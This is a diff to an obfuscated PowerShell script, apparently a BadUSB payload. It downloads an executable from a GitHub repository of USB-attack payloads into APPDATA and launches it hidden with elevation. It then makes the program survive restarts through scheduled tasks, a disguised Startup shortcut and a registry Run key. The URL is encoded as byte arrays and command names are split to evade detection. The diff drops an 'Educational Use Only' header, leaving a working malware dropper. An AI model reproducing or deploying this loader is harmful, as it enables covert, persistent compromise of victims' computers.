@@ -1,32 +1,46 @@
-# Educational Use Only — Extremely Obfuscated Gibberish Script
+# Split important functions into pieces
+${n} = 'N'+'ew'+'-Ob'+'ject'
+${e} = [Text.Encoding]::ASCII
 
-${___} = "ht"+"tps"+"://ra"+"w.githubusercontent"+"."+"com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/"+"WinUman.exe"
-${__1} = $env:APPDATA + '\' + ('W'+'i'+'n'+'U'+'m'+'a'+'n'+'.e'+'x'+'e')
-${___2} = $env:APPDATA + '\Mic'+'ros'+'oft\Win'+'dows\Start '+'Menu\Programs\Startup\WinUman.lnk'
+# Build the EXE download URL from ASCII bytes
+${u} = ${e}::GetString(([byte[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,116,104,101,45,115,104,97,100,111,119,45,119,97,108,107,101,114,47,98,97,100,45,117,115,98,45,102,108,105,112,112,101,114,45,112,97,121,108,111,97,100,115,47,109,97,105,110,47,69,88,69,47,87,105,110,85,109,97,110,46,101,120,101)))
 
-${o0o} = New-Object Net.WebClient
-$o0o.DowNLoADFiLe(${___}, ${__1})
+# File path
+${p} = "$env:APPDATA" + ('\'+'WinUman.exe')
 
-&("Sta"+"rt-Pro"+"cess") -FilePath ${__1} -Verb RunAs -WindowStyle Hidden
+# Download the file
+&("Inv"+"oke-WebRequest") -Uri ${u} -OutFile ${p} -UseBasicParsing
 
-$__TR = ${__1} -replace '\\','\\\\'
-&('ie'+'x') ("schtasks /Create /F /TN "+"WinUmanUnlock /TR "+$__TR+" /SC ONUNLOCK /RL HIGHEST /RU "+$env:USERNAME)
+# Execute file hidden with elevation
+&("St"+"art-Process") -FilePath ${p} -Verb ("Ru"+"nAs") -WindowStyle Hidden
 
-$__act = &("New"+"-Sched"+"uled"+"Task"+"Action") -Execute ${__1}
-$__tri = &('New'+'-Sche'+'duledTaskTrig'+'ger') -AtLogOn
-$__set = &('New-Sche'+'duledTaskSettingsSet') -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-    -RestartCount 5 -RestartInterval (&('New-T'+'imeSp'+'an') -Minutes 1) -StartWhenAvailable
-$__pri = &('New-Sched'+'uledTaskPrincipal') -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-$__tsk = &('New-Sche'+'duledTask') -Action $__act -Trigger $__tri -Settings $__set -Principal $__pri
-&('Register'+'-ScheduledTask') -TaskName ('WinUmanResilient') -InputObject $__tsk -Force
+# Task Action, Trigger
+${a} = &("New-Sch"+"eduledTaskAction") -Execute ${p}
+${t1} = &("New-Sch"+"eduledTaskTrigger") -AtLogOn
 
-$___ws = &('New-Object') -ComObject ('WScript.Shell')
-$___sc = $___ws.('Cr'+'eat'+'eSh'+'ortcut')(${___2})
-$___sc.('Targ'+'etPath') = ${__1}
-$___sc.('Worki'+'ngDirectory') = &('Split-Path') ${__1}
-$___sc.('Wind'+'owStyle') = 7
-$___sc.('Desc'+'ription') = "Updater"
-$___sc.Save()
+# Escape file path for schtasks
+${escaped} = ${p} -replace '\\','\\\\'
 
-&('Set-ItemPro'+'perty') -Path ("HKCU:\Soft"+"ware\Microsoft\Windows\CurrentVersion\Run") `
-    -Name "WinUman" -Value ${__1}
+# Alt trigger using schtasks manually
+&("schtasks") /Create /F /TN "WinUmanUnlock" /TR "${escaped}" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME" >$null
+
+# Settings and principal
+${s} = &("New-Sch"+"eduledTaskSettingsSet") -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
+${pr} = &("New-Sch"+"eduledTaskPrincipal") -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
+
+# Register task
+${task} = &("New-Sch"+"eduledTask") -Action ${a} -Trigger ${t1} -Settings ${s} -Principal ${pr}
+&("Register-Sch"+"eduledTask") -TaskName "WinUmanResilient" -InputObject ${task} -Force
+
+# Create shortcut in Startup folder
+${shell} = &${n} -ComObject WScript.Shell
+${sPath} = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUman.lnk"
+${sh} = ${shell}.CreateShortcut(${sPath})
+${sh}.TargetPath = ${p}
+${sh}.WorkingDirectory = (Split-Path ${p})
+${sh}.WindowStyle = 7
+${sh}.Description = "WU Shortcut"
+${sh}.Save()
+
+# Registry Run key fallback
+&("Set-I"+"temProperty") -Path ("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run") -Name "WinUman" -Value ${p}
